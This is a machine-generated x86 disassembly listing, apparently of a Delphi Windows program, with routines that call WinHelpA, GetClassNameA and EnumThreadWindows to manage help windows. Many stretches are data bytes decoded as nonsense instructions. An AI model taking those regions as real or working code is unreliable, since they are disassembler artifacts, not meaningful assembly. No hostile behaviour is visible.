pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43d1a6
lea eax [ ebp - 0x14 ]
mov edx 0x3
call sub_40402c
retn
cmp di 0x102
je r-xdata
push 0x0
lea edx [ ebp - 0xc ]
movzx eax di
call sub_408344
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax esi
call sub_43d284
jmp r-xdata
cmp di 0x105
je r-xdata
test al al
je r-xdata
cmp di 0x201
je r-xdata
mov [ esi + 0x10 ] 0x1
lea edx [ ebp - 0x10 ]
movzx eax di
call sub_408344
mov edx [ ebp - 0x10 ]
lea eax [ esi + 0x14 ]
call sub_40405c
mov eax [ ebp + 0x8 ]
push eax
movzx eax di
push eax
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_43c9e8
mov eax [ ebp - 0x14 ]
call sub_4044c8
push eax
mov eax [ ebp - 0x4 ]
push eax
call WinHelpA
cmp eax 0x1
sbb ebx ebx
inc ebx
cmp di 0xa
je r-xdata
cmp di 0x8
je r-xdata
cmp di 0x1
je r-xdata
cmp di 0x101
jne r-xdata
mov al 0x1
sub_43c8d4
mov ch 0xc8
inc ebx
add [ edi - 0x36ffbc38 ] bh
enter 0x43 0x6d
enter 0x43 0x75
enter 0x43 0x7d
enter 0x43 0x85
enter 0x43 0x8d
enter 0x43 0x95
mov edi 0xc90043c8
cmp dl ah
enter 0x43 0x20
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi - 0x6d ] ah
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
enter 0x43 0x9d
enter 0x43 0xa5
enter 0x43 0xad
enter 0x43 0x4d
enter 0x43 0x55
enter 0x43 0x5d
enter 0x43 0x65
enter 0x43 0x45
xchg ebp eax
cmp dl ah
enter 0x43 0x20
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edx * 4 - 0x4 ] ah
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
enter 0x43 0x3
add [ eax ] al
add [ esi - 0x6d ] ah
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
enter 0x43 0x45
cmp dl ah
enter 0x43 0x20
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ecx * 8 - 0x36e7ffbd ] bh
inc ebx
add [ eax ] al
add [ eax ] al
add [ ecx + ecx * 8 + 0x43 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
salc
leave
inc ebx
add [ eax + eax ] ah
add [ eax ] al
sub al 0x12
inc eax
add [ esp + esi + 0x40 ] bh
add [ eax - 0x3bffbfa6 ] bh
pop edx
inc eax
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah dl
pop edx
inc eax
add al ch
xor [ eax ] eax
pop esp
aam 0x43
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add ah cl
adc [ eax ] al
adc al 0x0
add [ eax ] al
add [ ebp + 0x1c0042 ] bh
add [ eax ] al
push cs
push esp
push edi
imul ebp [ esi + 0x48 ] 0x56706c65
imul esp [ ebp + 0x77 ] 0x408d7265
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_43ca9d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_404008
test edi edi
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_4040a0
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_40405c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43caa4
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40402c
retn
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
push [ ebp - 0x8 ]
push r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_404388
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
sub_43c9e8
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_43ca9d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_404008
test edi edi
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_4040a0
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_40405c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43caa4
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40402c
retn
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
push [ ebp - 0x8 ]
push r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_404388
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
sub_43cab8
push ebx
mov ebx eax
mov eax ebx
call sub_43cde8
cmp [ ebx + 0x1c ] 0x0
je r-xdata
pop ebx
retn
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
lea eax [ ebx + 0x1c ]
call sub_405a38
sub_43caf4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43cb5b
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov ebx 0x1
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_43c9e8
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0xc ]
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
mov ebx 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43cb62
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_43cb6c
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_43cbf4
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov ebx eax
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_43cae0
push [ ebp - 0x8 ]
push r-xdata
push edi
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_404388
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx edi
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43cbfb
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40402c
retn
sub_43cc07
inc [ edx ]
add [ eax ] al
add [ edx ] bh
and [ eax ] al
add [ eax + 0x5590c301 ] dh
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_43cc8f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_43d32c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43cc96
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40402c
retn
mov [ ebx + 0x10 ] 0x2
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x8 ]
lea ecx [ ebp - 0x4 ]
mov eax ebx
call sub_43c9e8
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x0
push 0x3
mov eax [ ebp - 0x4 ]
call sub_4044c8
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_43cc14
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_43cc8f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_43d32c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43cc96
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40402c
retn
mov [ ebx + 0x10 ] 0x2
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x8 ]
lea ecx [ ebp - 0x4 ]
mov eax ebx
call sub_43c9e8
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x0
push 0x3
mov eax [ ebp - 0x4 ]
call sub_4044c8
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_43cc9c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43cd94
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
jne r-xdata
lea eax [ ebp - 0x4 ]
push eax
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x14 ] 0xb
lea ecx [ ebp - 0x1c ]
xor edx edx
mov eax ebx
call sub_43c9e8
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
mov eax r-xdata
call sub_40905c
mov eax ebx
call sub_43d32c
test al al
je r-xdata
mov ecx sub_43c83c
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba84
call sub_4039c0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43cd9b
lea eax [ ebp - 0x1c ]
call sub_404008
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40402c
retn
lea ecx [ ebp - 0x8 ]
xor edx edx
mov eax ebx
call sub_43c9e8
push 0x0
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax ebx
call sub_43d284
test al al
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x1
lea eax [ ebx + 0x14 ]
mov edx [ ebp - 0x4 ]
call sub_40405c
mov eax [ ebp - 0x4 ]
call sub_4044c8
push eax
push 0x102
mov eax [ ebp - 0x8 ]
call sub_4044c8
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_43ce04
push ebx
mov ebx eax
mov eax ebx
call sub_43cde8
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea eax [ ebx + 0x1c ]
call sub_405a38
pop ebx
retn
mov eax rw-data
call sub_405a38
sub_43ce34
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_43ce8c
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43ce93
lea eax [ ebp - 0x4 ]
call sub_404008
retn
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax esi
call sub_43c9e8
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ebx eax
sub_43ce9c
push ebp
mov ebp esp
add esp 0xfffffef0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x110 ] ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43cf92
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x10c ] esi
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x10c ]
push eax
push 0x0
mov ecx r-xdata
lea eax [ ebp - 0x104 ]
mov edx 0xff
call sub_40901c
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_43c9e8
mov eax ebx
call sub_43d32c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43cf99
lea eax [ ebp - 0x110 ]
call sub_404008
lea eax [ ebp - 0x4 ]
call sub_404008
retn
push 0x0
lea eax [ ebp - 0x110 ]
lea edx [ ebp - 0x104 ]
mov ecx 0x100
call sub_404278
mov ecx [ ebp - 0x110 ]
mov dl 0x1
mov eax ebx
call sub_43d284
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x1
lea eax [ ebx + 0x14 ]
lea edx [ ebp - 0x104 ]
mov ecx 0x100
call sub_404278
lea eax [ ebp - 0x104 ]
push eax
push 0x102
mov eax [ ebp - 0x4 ]
call sub_4044c8
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_43cfb0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_43d012
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43d019
lea eax [ ebp - 0x8 ]
call sub_404008
retn
lea ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_43c9e8
mov ecx [ ebp - 0x8 ]
mov edx edi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov ebx eax
sub_43d024
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43d0a4
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_43c9e8
mov eax ebx
call sub_43d32c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43d0ab
lea eax [ ebp - 0x4 ]
call sub_404008
retn
push esi
xor ecx ecx
xor edx edx
mov eax ebx
call sub_43d284
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x0
mov [ ebx + 0x18 ] esi
push esi
push 0x1
mov eax [ ebp - 0x4 ]
call sub_4044c8
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_43d1b4
push ebp
mov ebp esp
add esp 0xffffff00
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push esi
call GetClassNameA
mov edx r-xdata
lea eax [ ebp - 0x100 ]
call sub_408a94
test eax eax
jne r-xdata
mov al [ ebx + 0xc ]
xor al 0x1
neg al
sbb eax eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ ebx + 0x4 ] esi
mov [ ebx + 0xc ] 0x1
sub_43d20f
add [ ebp - 0x75 ] dl
in al dx
add esp 0xffffff00
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push esi
call GetClassNameA
mov edx r-xdata
lea eax [ ebp - 0x100 ]
call sub_408a70
test eax eax
jne r-xdata
mov al [ ebx + 0xd ]
xor al 0x1
neg al
sbb eax eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ ebx + 0xd ] 0x1
mov [ ebx + 0x8 ] esi
sub_43d284
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_4044b8
xor eax eax
push ebp
push sub_43d2fa
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x5 ] 0x1
lea eax [ ebp - 0x18 ]
call sub_43d268
cmp [ ebp - 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43d301
lea eax [ ebp - 0x4 ]
call sub_404008
retn
cmp bl [ esi + 0x10 ]
jne r-xdata
sub bl 0x1
jb r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ esi + 0x18 ]
setne [ ebp - 0x5 ]
jne r-xdata
mov edx [ esi + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_40806c
test eax eax
setne [ ebp - 0x5 ]
jmp r-xdata
sub_43d310
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov al [ esp + 0xd ]
xor al 0x1
add esp 0x10
pop edi
pop esi
retn
sub_43d32c
push ebx
push esi
add esp 0xfffffff0
mov esi eax
xor ebx ebx
mov eax esp
call sub_43d268
cmp [ esp + 0xc ] 0x0
je r-xdata
mov edx esp
mov eax esi
call sub_43d30c
test al al
jne r-xdata
mov eax esp
push eax
push r-xdata
push 0x0
mov eax [ esp + 0x10 ]
push eax
call __imp_GetWindowThreadProcessId
push eax
call EnumThreadWindows
mov eax ebx
add esp 0x10
pop esi
pop ebx
retn
mov edx esp
mov eax esi
call sub_43d310
test al al
je r-xdata
mov bl 0x1
mov eax esi
call sub_43d388
sub_43d388
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi eax
xor eax eax
push ebp
push sub_43d405
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_43cde8
call GetTickCount
mov ebx eax
push 0x0
call sub_40659c
call GetTickCount
sub eax ebx
cmp eax 0x3e8
jbe r-xdata
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax esi
call sub_43c9e8
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43d40c
lea eax [ ebp - 0x4 ]
call sub_404008
retn
push 0x0
push 0x9
mov eax [ ebp - 0x4 ]
call sub_4044c8
push eax
mov eax [ esi + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_43d414
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403204
mov eax rw-data
mov edx esi
test edx edx
je r-xdata
add esp 0xfffffff0
call sub_403558
call sub_405a50
mov eax esi
test bl bl
je r-xdata
sub edx 0xffffffe0
mov eax esi
pop esi
pop ebx
retn
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_43d45c
push ebx
push esi
call sub_4035c0
mov ebx edx
mov esi eax
xor eax eax
mov [ rw-data ] eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403224
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a8
sub_43d488
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_43d4f6
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43d4fd
retn
mov eax [ rw-data ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax rw-data
call sub_405a38
mov eax rw-data
call sub_405a38
mov eax rw-data
call sub_405a38
mov eax rw-data
call sub_404008
mov eax rw-data
call sub_405a38
mov eax [ rw-data ]
call sub_43cab8
sub_43d500
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_43d552
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43d559
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_43d414
mov [ rw-data ] eax
mov eax [ rw-data ]
add eax 0x1c
call sub_405a38
mov edx eax
mov eax [ rw-data ]
call sub_42bfa0
sub_43d55c
pushad
aad 0x43
add [ ecx ] al
or al 0x54
dec ebp
outsd
popad
insb
push edx
jae r-xdata
inc ebx
outsd
insb
je r-xdata
inc esp
outsd
insb
jae r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
inc esp
add [ ecx + eax + 0x34900044 ] dl
inc eax
add [ esp + esi + 0x31cc0040 ] al
inc eax
add al ch
xor [ eax ] eax
and al 0x32
inc eax
add [ eax ] dh
add al [ eax + eax + 0x20 ]
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + ebp * 2 - 0x2a ] si
inc ebx
add [ edi ] al
or edx [ esp + eax * 2 + 0x72 ]
popad
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edi - 0x2a ] si
inc ebx
add [ ecx + edx + 0x40 ] bl
add [ eax ] al
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
nop
jl r-xdata
add [ eax + eax + 0xb ] eax
inc eax
add [ eax ] bh
salc
inc ebx
add [ eax ] al
add [ eax ] al
inc ebx
add bl al
inc ebx
add [ ecx ] al
pop es
push esp
inc ebx
jne r-xdata
add ah cl
xlat
inc ebx
add [ eax ] al
add [ eax ] al
nop
salc
inc ebx
add [ esp + esi + 0x40 ] bh
add [ ecx + eax + 0x1940044 ] ah
inc esp
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
inc esp
jb r-xdata
add [ ecx + eax + 0x44 ] al
add [ edx + eax ] al
inc esp
add [ ecx + eax + 0x54160044 ] dh
inc edx
popad
jae r-xdata
outsd
insb
jae r-xdata
add [ eax + eax ] dh
add [ eax ] al
or [ ecx ] dl
inc eax
add [ esp + esi + 0x40 ] bh
add [ ecx + eax + 0x1940044 ] ah
inc esp
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah cl
xor [ eax ] eax
call 0x24441666
xor al [ eax ]
fdiv st7
inc ebx
add [ eax ] ah
add [ eax + eax + 0x1c ] eax
add [ eax + eax + 0x20 ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop esp
salc
inc ebx
jae r-xdata
inc esp
inc ebx
outsd
outsb
je r-xdata
add [ eax ] al
int3
inc ebx
outsd
outsb
je r-xdata
add [ eax + eax + 0x1c ] eax
add [ eax + eax + 0x20 ] eax
add [ eax + eax - 0x28 ] al
add [ eax + eax - 0x1c ] eax
inc [ ebx ]
cmp [ ecx ] al
inc esp
add [ ecx + eax ] bh
inc esp
add [ ebx + 0x43d6dcc0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
xlat
inc ebx
add [ eax + eax ] bh
add [ eax ] al
in al dx
aad 0x43
add [ esp + esi + 0x40 ] bh
add [ ecx + eax + 0x1940044 ] ah
inc esp
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah cl
xor [ eax ] eax
call 0x2444170a
xor al [ eax ]
xor [ edx ] al
inc esp
add [ eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + edx * 8 + 0x43 ] bl
jb r-xdata
inc esp
add [ eax + 0x1c004404 ] ch
add [ eax + eax + 0x20 ] eax
inc ebx
outsd
outsb
je r-xdata
add al [ eax + eax - 0x4c ]
add [ eax + eax + 0x14 ] eax
push esp
inc esp
jb r-xdata
add [ eax + eax - 0x58 ] eax
add al [ eax + eax + 0x4 ]
add [ edx + eax + 0x44 ] bh
add [ eax ] ah
add [ eax + eax - 0x28 ] al
add [ eax + eax - 0x1c ] eax
inc [ ebx ]
mov [ edx ] al
inc esp
add [ ecx + eax ] bh
inc esp
add [ eax + 0x4004402 ] ch
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 + 0x2c ] si
fadd [ ebx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop eax
fadd [ ebx ]
inc eax
add [ eax ] al
add [ edi + edx * 8 + 0x43 ] dl
add [ esp + esi + 0x40 ] bh
add [ ecx + eax + 0x2c80044 ] ah
inc esp
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah cl
xor [ eax ] eax
call 0x2444185a
xor al [ eax ]
xor [ edx ] al
inc esp
add [ edx + eax + 0x44 ] ah
add [ eax + eax - 0x28 ] al
add [ eax + eax - 0x1c ] eax
inc [ ebx ]
mov [ edx ] al
inc esp
add [ ecx + eax ] bh
add [ eax + eax - 0x70 ] eax
xor al 0x40
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 + 0x24 ] si
xlat
inc ebx
add [ edi ] al
push ss
push esp
inc edx
popad
jae r-xdata
add [ eax + 0x7fffffff ] al
add [ eax ] al
mov eax eax
xchg esp eax
aad 0x43
add [ ebx ] al
push es
push esp
inc ecx
insb
imul esp [ edi + 0x6e ] 0x1
add [ esi ] al
add [ eax ] al
add [ eax + 0x60043d5 ] dl
popad
insb
dec esi
outsd
outsb
add eax 0x6f546c61
jo r-xdata
inc ebx
add [ esp + esi + 0x40 ] bh
add [ ecx + eax + 0x4bc0044 ] ah
inc esp
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah cl
xor [ eax ] eax
call 0x304419ae
add eax [ eax + eax + 0x30 ]
add al [ eax + eax - 0x58 ]
add al 0x44
add [ ecx + eax ] bl
inc esp
add [ eax ] ah
add [ eax + eax + 0x60 ] al
add eax [ eax + eax - 0x1c ]
inc [ ebx ]
cmp [ ecx ] al
inc esp
add [ ecx + eax ] bh
inc esp
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ esp + ecx - 0x27 ] si
inc ebx
add [ edi ] al
andps xmm0 [ edx + esi * 2 + 0x61 ]
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ esp + edi * 4 - 0x28 ] si
inc ebx
add [ eax ] ah
xlat
inc ebx
add [ eax ] al
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
add [ eax - 0x6bffbbfc ] al
add al 0x44
add [ esp + eax + 0x540f0044 ] dh
inc esp
jb r-xdata
add [ eax + eax + 0x3c ] eax
add [ eax + eax + 0x44 ] eax
add [ eax + eax - 0x44 ] eax
add eax [ eax + eax - 0x34 ]
add al [ eax + eax + 0x4 ]
add al 0x44
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
lea eax [ eax ]
mov esp 0x43d8
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bh
fadd [ ebx ]
jo r-xdata
add ah cl
xor [ eax ] eax
call 0x244417ce
xor al [ eax ]
xor [ edx ] al
inc esp
add [ edx + eax + 0x44 ] ah
test [ eax + eax * 2 ] dh
inc esp
jb r-xdata
push es
popad
insb
dec esp
je r-xdata
popad
insb
inc edx
outsd
je r-xdata
inc ecx
add [ edx + ebp * 4 + 0x41 ] ah
add [ ebx + ecx * 2 ] dl
inc edx
add [ eax ] al
dec ebx
inc edx
add [ eax + 0xe004416 ] bh
push esp
inc ebx
outsd
outsb
je r-xdata
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
mov eax eax
sbb al 0xda
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x26 ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ebx * 8 ] dh
add [ ecx + eax + 0x44 ] al
add [ ebx + eax + 0x2cc0044 ] bh
inc esp
add [ esp + eax ] al
inc esp
add [ eax - 0x6bffbbfc ] al
